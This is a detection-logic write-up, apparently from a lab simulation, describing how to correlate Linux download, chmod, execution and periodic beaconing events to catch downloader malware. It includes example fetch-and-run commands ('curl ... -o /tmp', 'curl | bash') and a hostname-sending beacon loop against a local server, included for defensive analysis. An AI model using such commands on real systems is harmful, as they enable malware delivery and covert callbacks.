# Suspicious File Download Activity Detection Logic

## Overview

This detection logic identifies potentially malicious file download activity by correlating multiple behavioral events that occur within a short period of time.

Rather than detecting a single action, the strategy focuses on the complete execution chain commonly observed during malware delivery and initial execution:

1. File downloaded from a remote source
2. Downloaded file stored in a temporary or user-controlled location
3. File permissions modified to allow execution
4. File executed shortly after download
5. Executed file initiates outbound beaconing activity

This sequence is significantly more suspicious than any individual event in isolation.

---

# Detection Objective

Detect files that are:

- downloaded from a remote source
- staged locally
- made executable
- executed shortly afterward
- begin network communication after execution

The objective is to identify malware delivery and execution activity prior to persistence or lateral movement.

---

# ATT&CK Mapping

## Primary Technique

T1105 — Ingress Tool Transfer

## Supporting Techniques

T1059 — Command and Scripting Interpreter

T1071 — Application Layer Protocol

T1036 — Masquerading (possible)

---

# Adversary Behaviour Model

## Typical Malware Delivery Chain

```text
Remote Server
      │
      ▼
File Downloaded
      │
      ▼
Stored Locally
      │
      ▼
chmod +x
      │
      ▼
Executed
      │
      ▼
Outbound Callback
      │
      ▼
Beaconing / C2
```

This pattern is frequently observed during:

* malware deployment
* downloader execution
* payload staging
* commodity malware infections
* initial access operations
* red-team payload delivery

---

# Detection Strategy

The detection consists of four correlated behavioral stages.

## Stage 1 — File Download

Identify command-line tools commonly used to retrieve remote content.

Examples:

```
curl http://server/file.sh -o /tmp/file.sh

wget http://server/file.sh

ftp
```

Indicators:

* curl execution
* wget execution
* ftp execution
* output written to local file

Suspicion increases when the destination is:

```
/tmp/
/var/tmp/
/dev/shm/
/home/*/Downloads/
/home/*/
```

Reason:

Attackers frequently avoid privileged directories and stage payloads in writable locations.

## Stage 2 — Permission Modification

Identify executable permission changes on recently downloaded files.

Examples:

```
chmod +x update.sh

chmod 755 update.sh
```

Indicators:

* chmod execution
* executable bit added

Reason:

Downloaded scripts and binaries often require execution permission before launch.

## Stage 3 — Rapid Execution

Identify execution of the same file shortly after permission modification.

Examples:

```
./update.sh

bash update.sh

sh update.sh
```

Indicators:

* file executed
* execution path matches downloaded file

Reason:

Legitimate software is often downloaded and stored before later use.

Immediate execution after download is more suspicious.

## Stage 4 — Post-Execution Network Activity

Identify outbound communication initiated by the downloaded payload.

Examples:

```
curl http://server/heartbeat

curl http://server/checkin

wget http://server/ping
```

Indicators:

* network client launched by downloaded file
* repeated outbound requests
* periodic communication intervals

Reason:

Malware commonly establishes command-and-control communications immediately after execution.

---

# Correlation Logic

Generate a detection when all conditions are observed:

```
Downloaded File
        ↓
Permission Change
        ↓
Execution
        ↓
Network Communication
```

Additional confidence if:

* execution occurs within minutes of download
* network communication begins immediately
* communication repeats on a fixed interval

---

# Observed Behaviour During Simulation

## Download Phase

Observed:

```
curl http://127.0.0.1:8080/update.sh -o /tmp/update.sh
```

Auditd telemetry captured:

```
a0="curl"
a1="http://127.0.0.1:8080/update.sh"
a3="/tmp/update.sh"
```

Evidence:

* remote file retrieval observed
* payload written to temporary directory

## Permission Modification Phase

Observed:

```
chmod +x /tmp/update.sh
```

Auditd telemetry captured:

```
a0="chmod"
a1="+x"
a2="/tmp/update.sh"
```

Evidence:

downloaded file modified to become executable

## Execution Phase

Observed:

```
/bin/bash /tmp/update.sh
```

Auditd telemetry captured:

```
a0="/bin/bash"
a1="/tmp/update.sh"
```

Evidence:

downloaded file executed shortly after staging


## Beaconing Phase

Observed:

```
curl -s http://127.0.0.1:8080/heartbeat?host=bunny-VirtualBox
```

Repeated activity observed every 30 seconds.

Supporting telemetry:

```
hostname
curl
sleep 30
hostname
curl
sleep 30
```

Evidence:

periodic outbound communication
fixed interval execution pattern
callback initiated by downloaded script

---

#Detection Assessment

## Confidence Level

High

Reason:

Multiple independent suspicious behaviors are correlated into a single activity chain.

The observed sequence demonstrates:

```
Download
    ↓
Permission Change
    ↓
Execution
    ↓
Beaconing
```

This substantially reduces alerting on isolated benign actions.

---

# False Positive Analysis

Potential False Positives

Developer Activity

Example:

```
curl https://internal-server/tool.sh -o /tmp/tool.sh
chmod +x /tmp/tool.sh
./tool.sh
```

Possible in:

* development environments
* lab environments
* CI/CD testing

Risk:
Medium

## Software Installation Scripts

Example:

```
curl https://vendor/install.sh | bash
```
Many legitimate installers perform:

* download
* permission modification
* execution

Examples:

* cloud agents
* monitoring agents
* developer tooling

Risk:
Medium

## Administrative Automation

Administrators may:

```
wget script.sh
chmod +x script.sh
./script.sh
```
during troubleshooting or maintenance.

Risk:
Medium

---

# False Positive Reduction

## Require Multi-Event Correlation

Do not alert on:

* download only
* chmod only
* execution only

Require the complete chain.

## Time-Based Correlation

Require:

```
Download
    ↓
Execution

within 5–15 minutes
```
This removes many benign long-term file storage cases.

## Beaconing Requirement

Increase severity only when:

```
Downloaded File
        ↓
Executed
        ↓
Initiates Repeated Network Activity
```
This dramatically improves fidelity.

## Allowlisting

Consider allowlisting:

* package managers
* software deployment systems
* configuration management tools
* approved installation repositories

Examples:

```
apt
dnf
yum
ansible
chef
puppet
```
---

# Detection Strengths

* Behavior-based
* Tool-agnostic
* Resistant to simple renaming
* Detects real attacker workflow
* Correlates multiple ATT&CK techniques
* High investigation value

---

# Detection Limitations

* Requires process execution telemetry
* Requires permission change visibility
* Requires network telemetry for highest fidelity
* May miss payloads executed without chmod
* May miss fileless download-and-execute techniques

---

# Final Assessment

The simulation successfully demonstrated a complete suspicious file delivery workflow.

Observed telemetry contained:

1. Remote payload download
2. Storage in temporary location
3. Executable permission modification
4. Immediate execution
5. Periodic outbound beaconing

The behavioral chain provides a strong foundation for a high-fidelity analytic capable of detecting downloader-based malware execution while maintaining manageable false-positive rates through event correlation and temporal constraints.
